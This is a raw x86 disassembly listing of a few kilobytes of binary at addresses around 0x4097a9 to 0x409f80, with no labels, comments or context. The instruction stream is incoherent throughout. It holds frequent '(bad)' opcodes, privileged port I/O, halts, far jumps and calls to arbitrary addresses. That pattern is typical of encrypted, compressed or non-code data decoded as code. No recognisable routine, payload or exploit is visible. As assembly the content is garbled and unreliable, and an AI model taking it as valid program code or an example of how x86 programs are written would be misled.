  4097a9:	out    dx,al
  4097aa:	mov    esp,0xb2904ada
  4097af:	xchg   ebp,eax
  4097b0:	loope  0x4097b6
  4097b2:	mov    ah,0x24
  4097b4:	in     al,0x7
  4097b6:	loope  0x40980e
  4097b8:	jmp    0x6d8b:0xe8ba59d5
  4097bf:	inc    edx
  4097c0:	push   ss
  4097c1:	mul    DWORD PTR ds:0x50e2beac
  4097c7:	adc    cl,BYTE PTR [ecx]
  4097c9:	ret    
  4097ca:	test   eax,0x9a8f6337
  4097cf:	enter  0x68ec,0xbb
  4097d3:	int3   
  4097d4:	mov    eax,0x5bd20cc4
  4097d9:	pop    edi
  4097da:	push   ebp
  4097db:	popf   
  4097dc:	arpl   WORD PTR [edi+0x256e2837],bx
  4097e2:	and    eax,0x7e24b5eb
  4097e7:	inc    esi
  4097e8:	mov    WORD PTR [esp+edx*2+0x26],es
  4097ec:	fbld   TBYTE PTR [ecx-0x33b0b8c4]
  4097f2:	jno    0x409795
  4097f4:	mov    eax,0xe7063f95
  4097f9:	mov    dh,0x8e
  4097fb:	loopne 0x409855
  4097fd:	call   0x37bcd7c9
  409802:	push   ecx
  409803:	inc    ecx
  409804:	test   eax,0xe8dae247
  409809:	xchg   ebx,eax
  40980a:	xor    bh,ah
  40980c:	cmc    
  40980d:	sar    DWORD PTR [eax+0x4f],0x85
  409811:	call   0x5d762fc3
  409816:	jecxz  0x409813
  409818:	dec    ebx
  409819:	aaa    
  40981a:	aam    0xf8
  40981c:	bound  esi,QWORD PTR [ebx+0x31]
  40981f:	push   ds
  409820:	test   DWORD PTR [edx-0x2265ac47],edx
  409826:	seta   BYTE PTR [ebp-0x3525b2d]
  40982d:	ins    DWORD PTR es:[edi],dx
  40982e:	xchg   esp,eax
  40982f:	jo     0x4097bc
  409831:	fisttp WORD PTR [ebx]
  409833:	and    al,0x42
  409835:	pop    esi
  409836:	xchg   ebx,eax
  409837:	outs   dx,BYTE PTR ds:[esi]
  409838:	or     BYTE PTR ss:[ecx+0x20],0xf0
  40983d:	(bad)  
  40983e:	and    edx,esp
  409840:	sub    al,0xa8
  409842:	aas    
  409843:	and    dl,al
  409845:	nop
  409846:	jns    0x409850
  409848:	fdivr  DWORD PTR [ecx]
  40984a:	xor    edi,eax
  40984c:	inc    ecx
  40984d:	std    
  40984e:	mov    dh,0x6f
  409850:	dec    esp
  409851:	xchg   ecx,eax
  409852:	leave  
  409853:	sbb    DWORD PTR [esi+ebp*4+0x462f6142],esi
  40985a:	popa   
  40985b:	cli    
  40985c:	or     al,0x7d
  40985e:	mov    ds:0x5ddb432,eax
  409863:	push   es
  409864:	pop    ss
  409865:	mov    cl,0xe
  409867:	mov    ds:0xb6816a82,eax
  40986c:	mov    cl,0x55
  40986e:	(bad)  
  40986f:	push   edi
  409870:	imul   eax,esp,0x939e75d
  409876:	sahf   
  409877:	clc    
  409878:	mov    eax,0xc3beb693
  40987d:	nop
  40987e:	adc    al,0xdb
  409880:	cmp    edx,DWORD PTR ds:0x53c7f424
  409886:	pop    es
  409887:	dec    ebx
  409888:	adc    al,0x5
  40988a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40988b:	adc    al,0x48
  40988d:	outs   dx,DWORD PTR ds:[esi]
  40988e:	test   al,0x6f
  409890:	push   ebp
  409891:	adc    cl,bh
  409893:	shr    DWORD PTR [ebp+0x6b],1
  409896:	pop    edx
  409897:	sub    DWORD PTR [edx+ebx*8+0x39fc076b],ebx
  40989e:	out    dx,eax
  40989f:	daa    
  4098a0:	aam    0x1f
  4098a2:	xchg   esp,eax
  4098a3:	out    0x52,al
  4098a5:	mov    edx,0x6e68f026
  4098aa:	clc    
  4098ab:	or     ebx,eax
  4098ad:	ret    
  4098ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098af:	xchg   esi,eax
  4098b0:	mov    ds,esi
  4098b2:	and    dl,ch
  4098b4:	retf   0x6f98
  4098b7:	(bad)  
  4098b8:	rcr    DWORD PTR [esi],1
  4098ba:	cli    
  4098bb:	mul    ch
  4098bd:	push   ds
  4098be:	fwait
  4098bf:	inc    esp
  4098c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098c1:	ss (bad) 
  4098c3:	clc    
  4098c4:	pop    ebx
  4098c5:	jmp    0x409909
  4098c7:	xchg   edi,eax
  4098c8:	xlat   BYTE PTR ds:[ebx]
  4098c9:	and    bh,BYTE PTR [esi]
  4098cb:	cli    
  4098cc:	add    bh,BYTE PTR [ebx-0xb6463e]
  4098d2:	lahf   
  4098d3:	mov    esp,DWORD PTR [ecx-0x46a03c7]
  4098d9:	test   eax,0xca08461
  4098de:	outs   dx,BYTE PTR ds:[esi]
  4098df:	in     al,0x3a
  4098e1:	pop    edi
  4098e2:	(bad)  
  4098e3:	mov    ds:0xab73cb5b,al
  4098e8:	fld    DWORD PTR [edi+0x256db469]
  4098ee:	call   0x1c8c:0x6d7eedcb
  4098f5:	xor    al,0x2b
  4098f7:	ror    BYTE PTR [ecx-0x77],1
  4098fa:	add    ebp,DWORD PTR [edx+0x3e]
  4098fd:	imul   ebx,DWORD PTR [ebp-0x620b498d],0xffffffe8
  409904:	push   ecx
  409905:	or     eax,DWORD PTR [edi+ebx*4+0x64b71a76]
  40990c:	adc    al,0x22
  40990e:	xor    eax,0xd083c96f
  409913:	dec    ecx
  409914:	int3   
  409915:	xchg   ecx,eax
  409916:	outs   dx,DWORD PTR ds:[esi]
  409917:	or     DWORD PTR [edx+0x5e035958],ebp
  40991d:	arpl   WORD PTR [edi+edi*1],di
  409920:	outs   dx,BYTE PTR ds:[esi]
  409921:	test   DWORD PTR [ebx-0x51],edi
  409924:	fcmove st,st(2)
  409926:	adc    al,0x44
  409928:	dec    edi
  409929:	xchg   esi,eax
  40992b:	xchg   edx,eax
  40992c:	stc    
  40992d:	fstp   QWORD PTR [ebx+ebp*2+0x1dd04539]
  409934:	fild   DWORD PTR [esi]
  409936:	add    esp,DWORD PTR [esi+0x71b7edbe]
  40993c:	arpl   WORD PTR [edx],sp
  40993e:	add    eax,0xf375724d
  409943:	mov    al,0xcc
  409945:	lds    edi,FWORD PTR [ecx-0x25]
  409948:	adc    eax,0x158d73c2
  40994d:	mov    ecx,0x25fc40fe
  409952:	out    dx,al
  409953:	mov    ds:0x6189a385,al
  409958:	outs   dx,BYTE PTR ds:[esi]
  409959:	push   ss
  40995a:	sbb    BYTE PTR [edi-0xd],cl
  40995d:	or     DWORD PTR [edi+0x5706b01c],edi
  409963:	cli    
  409964:	neg    DWORD PTR [ebx-0x5e4ad623]
  40996a:	xchg   esp,eax
  40996b:	ja     0x4098ee
  40996d:	jmp    DWORD PTR [ebp+0x55feb960]
  409973:	adc    bl,BYTE PTR [ecx-0x500e18d5]
  409979:	inc    edi
  40997a:	popa   
  40997b:	pop    ss
  40997c:	pusha  
  40997d:	outs   dx,DWORD PTR ds:[esi]
  40997e:	daa    
  40997f:	dec    ecx
  409980:	outs   dx,DWORD PTR ds:[esi]
  409981:	jmp    0xe387:0x21b77da4
  409988:	fld    QWORD PTR [edx]
  40998a:	aam    0x20
  40998c:	sub    BYTE PTR [edx+0x350855df],bl
  409992:	cli    
  409993:	mov    ds:0x92b8fb9e,al
  409998:	jmp    0x5a53781d
  40999d:	pop    edx
  40999e:	outs   dx,BYTE PTR ds:[esi]
  40999f:	cmp    al,0x3d
  4099a1:	cmp    edx,DWORD PTR [ecx+0x22bb821c]
  4099a7:	pop    ebx
  4099a8:	xchg   ebx,eax
  4099a9:	cld    
  4099aa:	hlt    
  4099ab:	inc    esp
  4099ac:	enter  0x80aa,0xa8
  4099b0:	add    dh,dh
  4099b2:	or     al,bh
  4099b4:	stos   DWORD PTR es:[edi],eax
  4099b5:	jnp    0x4099e0
  4099b7:	pop    ss
  4099b8:	loope  0x4099bf
  4099ba:	mov    ebx,0xee3cad95
  4099bf:	sbb    BYTE PTR [ebp+0xa6df2d2],0x47
  4099c6:	xchg   BYTE PTR [edx],bl
  4099c8:	sti    
  4099c9:	imul   esp,DWORD PTR [ecx+0x15828b08],0xffffffe7
  4099d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099d1:	std    
  4099d2:	test   al,0x99
  4099d4:	out    dx,al
  4099d5:	xchg   ecx,eax
  4099d6:	and    al,0x42
  4099d8:	mov    bh,0xa6
  4099da:	outs   dx,DWORD PTR ds:[esi]
  4099db:	xchg   ecx,eax
  4099dc:	add    al,0x5d
  4099de:	lods   al,BYTE PTR ds:[esi]
  4099df:	mov    bh,al
  4099e1:	out    0xda,al
  4099e3:	add    BYTE PTR [ecx+0x3b971b3c],0xa
  4099ea:	repz out dx,al
  4099ec:	and    eax,0x78ce2dac
  4099f1:	ins    BYTE PTR es:[edi],dx
  4099f2:	sbb    al,0x8a
  4099f4:	push   ebp
  4099f5:	imul   edx,DWORD PTR [ebx],0xdfa9de8d
  4099fb:	sub    BYTE PTR [eax-0x6c5a55db],bh
  409a01:	sub    eax,DWORD PTR [edi-0x5e61687f]
  409a07:	jle    0x409995
  409a09:	mov    eax,0x76b77187
  409a0e:	(bad)  
  409a10:	cld    
  409a11:	xchg   BYTE PTR [edi+0x55f6a27c],ah
  409a17:	imul   ebx,eax,0xe0b526c7
  409a1d:	xor    al,0x89
  409a1f:	mov    dh,BYTE PTR [edx+0x9]
  409a22:	jb     0x409a8a
  409a24:	and    eax,0x9f65fa0
  409a29:	xor    al,BYTE PTR [esi+0x1]
  409a2c:	add    bh,BYTE PTR [ecx-0x4b]
  409a2f:	push   ds
  409a30:	ja     0x4099bf
  409a32:	adc    esp,ecx
  409a34:	dec    esp
  409a35:	jo     0x409a40
  409a37:	std    
  409a38:	adc    BYTE PTR [edi-0xc],dl
  409a3b:	pop    ecx
  409a3c:	shl    BYTE PTR [edx+0x14d3fb45],1
  409a42:	add    al,0xcf
  409a44:	cld    
  409a45:	loopne 0x409a24
  409a47:	jge    0x409a82
  409a49:	out    dx,eax
  409a4a:	push   0x61cddf6a
  409a4f:	adc    al,0xc8
  409a51:	or     DWORD PTR [ebp+0x729db72],ebx
  409a57:	or     DWORD PTR [edx+0x5],esi
  409a5a:	add    eax,0xd921be58
  409a5f:	mov    al,0x58
  409a61:	xor    edx,DWORD PTR [eax]
  409a63:	cmp    bl,BYTE PTR [ebp+0x57ca55f3]
  409a69:	adc    al,0x89
  409a6b:	jle    0x409a17
  409a6d:	jo     0x409a84
  409a6f:	jmp    0xbad4abfb
  409a74:	jbe    0x409a65
  409a76:	fcomip st,st(5)
  409a78:	ror    BYTE PTR [edi],cl
  409a7a:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a7c:	cmp    DWORD PTR [edx-0x2f],esp
  409a7f:	loopne 0x409aa8
  409a81:	sub    eax,0x3702a7c1
  409a86:	pop    esi
  409a87:	in     al,dx
  409a88:	adc    ch,ch
  409a8a:	inc    esi
  409a8b:	or     eax,0xfb0e9b06
  409a90:	jb     0x409a71
  409a92:	mov    bh,0xa9
  409a94:	xor    ch,BYTE PTR ds:0x3b42135f
  409a9a:	mov    fs,WORD PTR [ebx+edi*2+0x7cad256f]
  409aa1:	jp     0x409a4e
  409aa3:	cmc    
  409aa4:	pop    esp
  409aa5:	and    eax,0xe8df2fe
  409aaa:	cwde   
  409aab:	(bad)
  409aaf:	xchg   esp,eax
  409ab0:	(bad)
  409ab4:	cmp    DWORD PTR [edi-0x7dc629b8],0xd9832469
  409abe:	fidivr DWORD PTR [ecx+0x24]
  409ac1:	add    eax,0xc6cc6817
  409ac6:	enter  0xdb33,0xc6
  409aca:	adc    al,0xf1
  409acc:	jns    0x409a6f
  409ace:	leave  
  409acf:	hlt    
  409ad0:	in     eax,0xde
  409ad2:	push   cs
  409ad3:	mov    cl,0xd7
  409ad5:	sti    
  409ad6:	jae    0x409ac4
  409ad8:	push   ebx
  409ad9:	or     edx,eax
  409adb:	adc    al,0x5f
  409add:	mov    al,0x2e
  409adf:	pop    esi
  409ae0:	sbb    edx,DWORD PTR [ecx-0x7cecd564]
  409ae6:	mov    cl,0xbe
  409ae8:	jecxz  0x409b34
  409aea:	lods   al,BYTE PTR ds:[esi]
  409aeb:	dec    esp
  409aec:	sub    eax,0xefaa369b
  409af1:	sahf   
  409af2:	xor    dl,0x47
  409af5:	stos   DWORD PTR es:[edi],eax
  409af6:	daa    
  409af7:	dec    eax
  409af8:	cmp    DWORD PTR ds:0xea86e25f,0x8294bcd7
  409b02:	lds    eax,FWORD PTR [esi-0x7b150368]
  409b08:	jns    0x409a8a
  409b0a:	(bad)  
  409b0b:	imul   edx,eax,0x1c99fc93
  409b11:	pop    ds
  409b12:	add    eax,0x23a61bca
  409b17:	mov    edx,0x6b853e9c
  409b1c:	out    0x9f,eax
  409b1e:	mov    ebx,0xc954c55
  409b23:	or     bl,BYTE PTR [edi-0x71aab3c5]
  409b29:	push   0xfffffff1
  409b2b:	sar    BYTE PTR [edi-0x651a6554],1
  409b31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b32:	add    eax,0xec3b2a5e
  409b37:	aas    
  409b38:	fisub  WORD PTR [edx-0x14c05233]
  409b3e:	xchg   edx,eax
  409b3f:	mov    eax,0x1e9b0eb6
  409b44:	mov    cl,0x5d
  409b46:	and    DWORD PTR [edi+0x64],eax
  409b49:	cmovno ebx,esi
  409b4c:	aam    0x0
  409b4e:	sbb    ch,BYTE PTR [esi+0x26]
  409b51:	xchg   BYTE PTR [edx+0x32c31974],cl
  409b57:	or     ebp,0xffffffad
  409b5a:	adc    ah,BYTE PTR [ebx+ebx*2+0x31]
  409b5e:	sub    eax,0xafe44006
  409b63:	jmp    0x21be:0xfd67857
  409b6a:	cmc    
  409b6b:	frstor [edx-0x21]
  409b6e:	mov    bl,0x9d
  409b70:	inc    ecx
  409b71:	std    
  409b72:	cs sub dl,bl
  409b75:	jbe    0x409b84
  409b77:	fwait
  409b78:	and    DWORD PTR [edx-0x1d],0x79
  409b7c:	std    
  409b7d:	mov    ds:0x9264537,al
  409b82:	pop    edx
  409b83:	ss mov ebp,0xc6ac6979
  409b89:	loope  0x409b14
  409b8b:	dec    ecx
  409b8c:	lods   al,BYTE PTR ds:[esi]
  409b8d:	jg     0x409be5
  409b8f:	loope  0x409c0e
  409b91:	push   esi
  409b92:	and    esp,DWORD PTR [ebp-0x7988f387]
  409b98:	jae    0x409ba1
  409b9a:	push   ebx
  409b9b:	pop    ebp
  409b9c:	sub    dh,BYTE PTR [edi+0xbcac5d3]
  409ba2:	ret    0x122b
  409ba5:	jge    0x409bbd
  409ba7:	or     BYTE PTR [ecx-0x3d2de052],bh
  409bad:	jl     0x409c0d
  409baf:	pop    edx
  409bb0:	popa   
  409bb1:	xor    DWORD PTR [ebx],edx
  409bb3:	hlt    
  409bb4:	jecxz  0x409b80
  409bb6:	fstp   QWORD PTR [ecx+0x5e]
  409bb9:	dec    ebx
  409bba:	xchg   ecx,eax
  409bbb:	xchg   edi,eax
  409bbc:	shl    edx,1
  409bbe:	daa    
  409bbf:	inc    ebx
  409bc0:	leave  
  409bc1:	or     DWORD PTR [edi+0x60f86429],ebx
  409bc7:	ins    DWORD PTR es:[edi],dx
  409bc8:	rol    ebx,cl
  409bca:	mov    ah,0xb0
  409bcc:	lea    eax,[edx+0x52]
  409bcf:	ins    DWORD PTR es:[edi],dx
  409bd0:	adc    BYTE PTR [esi],bh
  409bd2:	adc    bl,BYTE PTR [esi-0x13]
  409bd5:	dec    ecx
  409bd6:	mov    edi,0x979ed83a
  409bdb:	jl     0x409bc9
  409bdd:	out    0x70,eax
  409bdf:	pmulhuw mm2,mm3
  409be2:	or     al,0x97
  409be4:	jmp    0xe1ac26ef
  409be9:	mov    bh,0x3f
  409beb:	(bad)  
  409bec:	sbb    eax,0xab344d9
  409bf1:	push   ss
  409bf2:	pusha  
  409bf3:	inc    ecx
  409bf4:	sti    
  409bf5:	imul   esp,DWORD PTR [esi-0x24],0x87d469ae
  409bfc:	jmp    0x409bba
  409bfe:	mov    al,ds:0x7afb2a89
  409c03:	xchg   edx,eax
  409c04:	leave  
  409c05:	mov    bl,0x62
  409c07:	push   cs
  409c08:	leave  
  409c09:	cmp    bl,BYTE PTR [ebp-0x1aa7342c]
  409c0f:	fxam   
  409c11:	shr    DWORD PTR ds:0x6fcdf874,0x92
  409c18:	(bad)  
  409c19:	mov    al,0x3b
  409c1b:	push   ds
  409c1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c1d:	dec    ecx
  409c1e:	inc    ebp
  409c1f:	xchg   edi,eax
  409c20:	inc    eax
  409c21:	jae    0x409c7b
  409c23:	std    
  409c24:	data16 fst QWORD PTR [ebx-0x13]
  409c28:	sbb    DWORD PTR [eax],edx
  409c2a:	xor    al,0xdb
  409c2c:	test   al,0xff
  409c2e:	mov    ecx,0x9f68307c
  409c33:	jmp    0xc28ecf7e
  409c38:	pusha  
  409c39:	push   es
  409c3a:	ins    DWORD PTR es:[edi],dx
  409c3b:	icebp  
  409c3c:	in     eax,0x6c
  409c3e:	retf   0x1b3b
  409c41:	inc    esp
  409c42:	or     esi,0x83678320
  409c48:	cwde   
  409c49:	scas   al,BYTE PTR es:[edi]
  409c4a:	cmp    ebp,esi
  409c4c:	and    eax,0x14c648af
  409c51:	sbb    DWORD PTR [edi],0xffffffc9
  409c54:	pop    es
  409c55:	mov    dl,0x82
  409c57:	inc    ecx
  409c58:	sbb    eax,0xea4c1ae0
  409c5d:	out    dx,eax
  409c5e:	into   
  409c5f:	cmp    DWORD PTR [edx+0x4ad10c23],ebp
  409c65:	rcl    BYTE PTR [eax-0x35],1
  409c68:	adc    eax,0x8f4cf727
  409c6d:	rol    DWORD PTR [ebp+0x3b],1
  409c70:	xor    cl,al
  409c72:	shr    BYTE PTR [edi],1
  409c74:	jns    0x409c4d
  409c76:	push   DWORD PTR [ecx+0x4cadf948]
  409c7c:	and    eax,0x7f7abb7c
  409c81:	adc    eax,0x516d9a51
  409c86:	pop    ebp
  409c87:	cli    
  409c88:	ret    
  409c89:	mov    ch,0x94
  409c8b:	sti    
  409c8c:	xchg   ebp,eax
  409c8d:	(bad)  
  409c8e:	iret   
  409c8f:	dec    esp
  409c90:	popf   
  409c91:	or     al,0xe9
  409c93:	push   edx
  409c94:	and    BYTE PTR [ecx+0x3e],ah
  409c97:	push   0xffffff8f
  409c99:	push   ds
  409c9a:	inc    esi
  409c9b:	in     al,0x15
  409c9d:	cmp    BYTE PTR [ebx],0x28
  409ca0:	sbb    dh,BYTE PTR [ebp+ebx*1+0x43]
  409ca4:	mov    al,0x9f
  409ca6:	cmp    al,0x26
  409ca8:	mov    bl,0x35
  409caa:	and    dh,dh
  409cac:	(bad)  ds:0x4409754a
  409cb2:	jno    0x409c97
  409cb4:	adc    al,0xe7
  409cb6:	lds    eax,FWORD PTR [eax]
  409cb8:	imul   edx,DWORD PTR [edi+0x0],0x26
  409cbc:	sbb    ah,ch
  409cbe:	in     al,0xe2
  409cc0:	fmul   QWORD PTR [ebx+edi*8+0x7e]
  409cc4:	(bad)  
  409cc5:	je     0x409cbb
  409cc7:	adc    ch,BYTE PTR [eax-0x7a]
  409cca:	daa    
  409ccb:	or     BYTE PTR [ecx+0x26],0x1c
  409ccf:	arpl   WORD PTR [edx],si
  409cd1:	cwde   
  409cd2:	fcom   DWORD PTR [edx+0xa]
  409cd5:	clc    
  409cd6:	jae    0x409d33
  409cd8:	mov    WORD PTR [eax+0x4f660445],gs
  409cde:	inc    esi
  409cdf:	ins    BYTE PTR es:[edi],dx
  409ce0:	push   ebp
  409ce1:	scas   eax,DWORD PTR es:[edi]
  409ce2:	lods   al,BYTE PTR ds:[esi]
  409ce3:	and    bl,bh
  409ce5:	call   FWORD PTR [edx+0x33]
  409ce8:	lods   eax,DWORD PTR ds:[esi]
  409ce9:	ret    0xbb17
  409cec:	not    BYTE PTR [ebp-0x4c]
  409cef:	jnp    0x409c96
  409cf1:	aad    0xfa
  409cf3:	jb     0x409cf0
  409cf5:	lea    ecx,[ebp+0x3b0b5915]
  409cfb:	inc    esi
  409cfc:	push   edi
  409cfd:	ret    
  409cfe:	xor    cl,bh
  409d00:	(bad)  
  409d01:	out    0xac,eax
  409d03:	add    eax,0x407ee87
  409d08:	shl    BYTE PTR [edi+0x1017dbfe],0xeb
  409d0f:	pop    edi
  409d10:	and    eax,0xfb7e09c5
  409d15:	lahf   
  409d16:	inc    esp
  409d17:	(bad)
  409d1a:	inc    ebp
  409d1b:	xlat   BYTE PTR ds:[ebx]
  409d1c:	lods   al,BYTE PTR ds:[esi]
  409d1d:	mov    edi,0xb1d3039c
  409d22:	mov    al,0xf6
  409d24:	and    bl,dh
  409d26:	sbb    ah,al
  409d28:	fwait
  409d29:	stos   DWORD PTR es:[edi],eax
  409d2a:	xor    al,0xcf
  409d2c:	jno    0x409d97
  409d2e:	les    ebx,FWORD PTR [edi+edx*4]
  409d31:	cmp    bl,ah
  409d33:	cwde   
  409d34:	jae    0x409cbc
  409d36:	add    DWORD PTR [edx+0x38f622a],eax
  409d3c:	or     esp,DWORD PTR [esi+edi*2-0x51]
  409d40:	sbb    BYTE PTR gs:[edx-0x24],cl
  409d44:	out    0xe2,al
  409d46:	mov    ebx,0x27eb1c43
  409d4b:	mov    bh,0xd9
  409d4d:	and    eax,0x60883b92
  409d52:	cs loopne 0x409d0a
  409d55:	add    eax,0xb3cc069a
  409d5a:	aad    0xd3
  409d5c:	jnp    0x409d20
  409d5e:	pop    es
  409d5f:	mov    ch,0x8a
  409d61:	jno    0x409d12
  409d63:	inc    ebx
  409d64:	(bad)  
  409d65:	and    eax,0xdcb87551
  409d6a:	jnp    0x409d29
  409d6c:	jge    0x409cef
  409d6e:	loope  0x409d47
  409d70:	inc    ebx
  409d71:	sub    BYTE PTR [edx],bl
  409d73:	add    esp,ecx
  409d75:	icebp  
  409d76:	mul    bh
  409d78:	sbb    ch,BYTE PTR [edx+ecx*1+0x29]
  409d7c:	xor    al,0x47
  409d7e:	leave  
  409d7f:	dec    esi
  409d80:	or     al,0x6
  409d82:	and    ecx,ecx
  409d84:	into   
  409d85:	cmp    BYTE PTR [edi-0x72f33356],ah
  409d8b:	nop
  409d8c:	sub    BYTE PTR [esi],0x80
  409d8f:	jb     0x409df1
  409d91:	fwait
  409d92:	ins    DWORD PTR es:[edi],dx
  409d93:	neg    BYTE PTR [esi+ebp*2-0x7f]
  409d97:	pop    es
  409d98:	adc    BYTE PTR [edi+eiz*1],cl
  409d9b:	or     DWORD PTR [ebp-0x457be41c],0x8f537ab5
  409da5:	pusha  
  409da6:	stc    
  409da7:	inc    eax
  409da8:	mov    al,ds:0xf39517f3
  409dad:	lea    ebp,[ecx+0x30]
  409db0:	repnz add bl,ch
  409db3:	daa    
  409db4:	xchg   edi,eax
  409db5:	inc    ecx
  409db6:	and    ch,BYTE PTR [edi+0x3bf132d4]
  409dbc:	dec    esp
  409dbd:	fldz   
  409dbf:	fnstcw WORD PTR [ebx]
  409dc1:	ret    
  409dc2:	mov    esp,DWORD PTR [edi]
  409dc4:	mov    esp,0xcfdda3ac
  409dc9:	nop
  409dca:	les    ecx,FWORD PTR [eax+0x11]
  409dcd:	fs (bad) 
  409dcf:	std    
  409dd0:	adc    al,0x39
  409dd2:	outs   dx,DWORD PTR ds:[esi]
  409dd3:	cs cmp al,0xd1
  409dd6:	jno    0x409d75
  409dd8:	in     al,dx
  409dd9:	out    dx,eax
  409dda:	fadd   QWORD PTR [edi]
  409ddc:	ins    BYTE PTR es:[edi],dx
  409ddd:	cli    
  409dde:	and    esi,DWORD PTR [edx+0x6e]
  409de1:	sar    DWORD PTR [edx+edi*2+0x7e0b5d9b],0xc
  409de9:	cmp    al,bh
  409deb:	inc    ebp
  409dec:	push   edx
  409ded:	js     0x409d90
  409def:	iret   
  409df0:	test   eax,0xb45d385f
  409df5:	not    BYTE PTR [ecx+ebx*2-0x1e2a9d73]
  409dfc:	mov    edi,0xb47e6a56
  409e01:	xchg   ebp,edx
  409e03:	call   0x5ac5:0x2d69e740
  409e0a:	pop    edx
  409e0b:	mov    dl,0xe2
  409e0d:	sbb    eax,0x59ed9d09
  409e12:	ficom  DWORD PTR [edi]
  409e14:	cs ret 0x3891
  409e18:	enter  0xb1e2,0x5e
  409e1c:	or     BYTE PTR [esi-0x8d43c56],0xa9
  409e23:	cwde   
  409e24:	mov    BYTE PTR [edi+esi*4-0x38],cl
  409e28:	sub    al,0x10
  409e2a:	xchg   edx,eax
  409e2b:	popa   
  409e2c:	or     BYTE PTR [edx-0x9],dl
  409e2f:	inc    ecx
  409e30:	rcl    BYTE PTR [edx],1
  409e32:	(bad)  
  409e33:	jl     0x409e0f
  409e35:	sahf   
  409e36:	ss fs or ax,0x6fd0
  409e3c:	adc    BYTE PTR [edx],dh
  409e3e:	test   eax,0xd09808cb
  409e43:	and    BYTE PTR [edi+0x22],al
  409e46:	ds push cs
  409e48:	or     BYTE PTR [edx],dl
  409e4a:	retf   
  409e4b:	pop    ss
  409e4c:	inc    ecx
  409e4d:	rol    DWORD PTR [ebx],1
  409e4f:	xchg   BYTE PTR ds:0x14350a2d,bh
  409e55:	xor    DWORD PTR [ecx+0x62],esi
  409e58:	push   ebx
  409e59:	gs pushf 
  409e5b:	test   al,0x74
  409e5d:	and    DWORD PTR [esp+esi*2+0x2b],esp
  409e61:	out    0xd2,eax
  409e63:	dec    eax
  409e64:	cmp    eax,0xe01fdeb6
  409e69:	adc    al,0x0
  409e6b:	btc    edx,ebx
  409e6e:	fnsave [edi+0x27674c29]
  409e74:	sub    eax,0x7392b1b9
  409e79:	sbb    ch,bl
  409e7b:	(bad)  
  409e7c:	daa    
  409e7d:	pusha  
  409e7e:	push   DWORD PTR [ebp+0x45f04452]
  409e84:	call   0x5a0a:0xa9733028
  409e8b:	stos   DWORD PTR es:[edi],eax
  409e8c:	sbb    al,0x85
  409e8e:	les    edx,FWORD PTR [edx-0x6a]
  409e91:	fnsave [ebx-0x9b003d]
  409e97:	cmp    esi,esi
  409e99:	iret   
  409e9a:	push   0x73
  409e9c:	cdq    
  409e9d:	push   0xffffffc7
  409e9f:	inc    ecx
  409ea0:	adc    BYTE PTR [esi-0x3638b017],bh
  409ea6:	int    0x63
  409ea8:	adc    DWORD PTR [ebx],ebp
  409eaa:	dec    esi
  409eab:	mov    ebx,0x26b1e492
  409eb0:	push   ebp
  409eb1:	cmp    al,0xd
  409eb3:	push   cs
  409eb4:	sub    ecx,DWORD PTR [ebx+0x3fa720c0]
  409eba:	scas   al,BYTE PTR es:[edi]
  409ebb:	pop    edx
  409ebd:	cmp    eax,0xb9101958
  409ec2:	retf   0x286f
  409ec5:	pushf  
  409ec6:	push   cs
  409ec7:	mov    ?,ecx
  409ec9:	cmp    BYTE PTR [ebx],bh
  409ecb:	and    bl,BYTE PTR [eax]
  409ecd:	mov    esi,DWORD PTR [eax+0x29]
  409ed0:	cld    
  409ed1:	in     eax,dx
  409ed2:	aas    
  409ed3:	push   edi
  409ed4:	push   cs
  409ed5:	jne    0x409eba
  409ed7:	pop    ebp
  409ed8:	push   ebp
  409ed9:	add    ecx,edx
  409edb:	lods   eax,DWORD PTR ds:[esi]
  409edc:	mov    ch,BYTE PTR [esi+0x62f8a527]
  409ee2:	mov    esp,0xea88d8ea
  409ee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ee8:	add    ah,ch
  409eea:	sub    BYTE PTR [edi+ebp*1+0x5ccdb05f],cl
  409ef1:	pop    esp
  409ef2:	shl    BYTE PTR [esi+0x577a6b3e],1
  409ef8:	es cmp eax,0xd8b16f0c
  409efe:	cmp    BYTE PTR [eax-0x7e17b771],cl
  409f04:	or     BYTE PTR [ebx-0x27],bl
  409f07:	add    ecx,esi
  409f09:	mov    ebx,DWORD PTR [edx+0x79]
  409f0c:	mov    esi,0x922e551a
  409f11:	into   
  409f12:	xchg   esp,eax
  409f13:	hlt    
  409f14:	pop    eax
  409f15:	lods   eax,DWORD PTR ds:[esi]
  409f16:	ins    DWORD PTR es:[edi],dx
  409f17:	mov    ebx,0xd6da2033
  409f1c:	xor    eax,0x958d9831
  409f21:	stos   BYTE PTR es:[edi],al
  409f22:	mov    ds:0x969f46f7,al
  409f27:	dec    BYTE PTR [edx-0x54]
  409f2a:	lods   eax,DWORD PTR ds:[esi]
  409f2b:	int    0x3e
  409f2d:	inc    ecx
  409f2f:	adc    DWORD PTR [eax],edx
  409f31:	cld    
  409f32:	shr    BYTE PTR [esi-0x8],0x96
  409f36:	sti    
  409f37:	mov    ebx,0x1a39785
  409f3c:	inc    ecx
  409f3d:	sub    ebp,DWORD PTR [edx-0x4b]
  409f40:	dec    edx
  409f41:	jne    0x409fa1
  409f43:	stos   BYTE PTR es:[edi],al
  409f44:	retf   
  409f45:	fstp   TBYTE PTR [edx+0x737b5742]
  409f4b:	jbe    0x409ee1
  409f4d:	arpl   cx,di
  409f4f:	and    eax,ebp
  409f51:	cmp    BYTE PTR ds:0xfec16e38,ah
  409f57:	std    
  409f58:	cdq    
  409f59:	arpl   WORD PTR [ebx],di
  409f5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f5c:	jno    0x409f08
  409f5e:	test   al,0x43
  409f60:	icebp  
  409f61:	fisubr WORD PTR [esi]
  409f63:	test   DWORD PTR [esi-0x4f663b25],ebx
  409f69:	arpl   si,sp
  409f6b:	nop
  409f6c:	imul   edi,DWORD PTR [ebx-0x5e1d97],0xcc5efbcc
  409f76:	test   DWORD PTR [eax],ebx
  409f78:	mov    cl,0x5f
  409f7a:	sbb    bl,ah
  409f7c:	repz les ebx,FWORD PTR cs:[eax]
  409f80:	out    0x0,al
